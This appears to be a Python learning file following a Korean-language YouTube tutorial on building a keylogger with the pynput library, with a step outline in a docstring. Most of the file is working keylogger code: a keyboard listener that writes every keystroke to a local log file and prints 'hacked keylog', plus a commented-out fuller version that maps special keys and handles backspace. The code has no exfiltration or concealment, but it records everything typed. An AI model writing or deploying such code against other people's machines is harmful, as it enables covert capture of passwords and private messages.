'''
url : https://www.youtube.com/watch?v=9HCmuaertF8&list=PLhTjy8cBISEoYoJd-zR8EV0NqDddAjK3m
#1 소개
1.1 pip3 install pynput
#2 파일 입출력
2.1 keystrokes 텍스트파일에 저장
#3 'with' keyword  -> memory/resource automatically
3.1 파일 핸들링(읽고 쓰는것)
#4 Using Pynput modual : Library for controlling input streams(Keyboard, mouse)
4.1 Controlling your mouse
4.2 Listening to your mouse
4.3 Controlling your Keyboard
4.4 Listening to your Keyboard - Will be finally used in our keylogger
#5 Control mouse/keyboard using Pynput
#6 Listening for keyboard strokes
#7 Cleaning the log file
#8 Keycodes in Pynput
'''
#from pynput.mouse import Controller
from pynput.keyboard import Controller, Listener
'''
def controlMouse():
        mouse = Controller()
        mouse.position = (500, 200)
def controlKeyboard():
        keyboard = Controller()
        keyboard.type(" i am good")
controlKeyboard()
'''
def write_to_file(key):
        keydata = str(key)
        keydata = keydata.replace("'", "")
        if keydata == 'Key.space':
                keydata = ' '
        if keydata == 'Key.shift_r':
                keydata = ''
        if keydata == 'Key.ctrl_l':
                keydata = ''
        if keydata == 'Key.enter':
                keydata = '\n'
        print("hacked keylog : {}".format(keydata))
        with open("log_key.txt", "a") as f:
                f.write(keydata)
        
with Listener(on_press=write_to_file) as l:
        l.join()
'''
from pynput.keyboard import Listener


def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")
    # Need to set up handlers for non-character keys
    # There are a few of them...

    if letter == 'Key.space':
        letter = " "

    if letter == 'Key.alt':
        letter = " [alt] "

    if letter == 'Key.alt_gr':
        letter = " [alt] "

    if letter == 'Key.alt_l':
        letter = " [alt] "

    if letter == 'Key.alt_r':
        letter = " [alt] "

    if letter == 'Key.backspace':
        with open('KeyLog.txt', mode='r') as rf:
            te = rf.read()
            te = te[:-1]
            with open('KeyLog.txt', mode='w') as bf:
                bf.write(te)
        letter = ""

    if letter == 'Key.caps_lock':
        letter = " [CAPS] "

    if letter == 'Key.cmd':
        letter = " [cmd] "

    if letter == 'Key.cmd_l':
        letter = " [cmd] "

    if letter == 'Key.cmd_r':
        letter = " [cmd] "

    if letter == 'Key.ctrl_l':
        letter = " [ctrl] "

    if letter == 'Key.ctrl_r':
        letter = " [ctrl] "

    if letter == 'Key.delete':
        letter = "[delete] "

    if letter == 'Key.down':
        letter = " [down] "

    if letter == 'Key.end':
        letter = " [end] "

    if letter == 'Key.enter':
        letter = "\n"

    if letter == 'Key.esc':
        letter = " [esc] "

    if letter == 'Key.f1':
        letter = " [F1] "

    if letter == 'Key.home':
        letter = " [home] "

    if letter == 'Key.insert':
        letter = " [ins] "

    if letter == 'Key.left':
        letter = " [left] "

    if letter == 'Key.menu':
        letter = " [menu] "

    if letter == 'Key.num_lock':
        letter = " [num_lock] "

    if letter == 'Key.page_down':
        letter = " [page_down] "

    if letter == 'Key.page_up':
        letter = " [page_up] "

    if letter == 'Key.pause':
        letter = " [pause] "

    if letter == 'Key.print_screen':
        letter = " [print_screen] "

    if letter == 'Key.right':
        letter = " [right] "

    if letter == 'Key.scroll_lock':
        letter = " [scroll_lock] "

    if letter == 'Key.shift':
        letter = ""

    if letter == 'Key.shift_l':
        letter = ""

    if letter == 'Key.shift_r':
        letter = ""

    if letter == 'Key.tab':
        letter = "    "
    if letter == 'Key.up':
        letter = " [up] "


    with open('KeyLog.txt', mode='a') as f:
        f.write(letter)


with Listener(on_press=write_to_file) as l:
    l.join()
'''
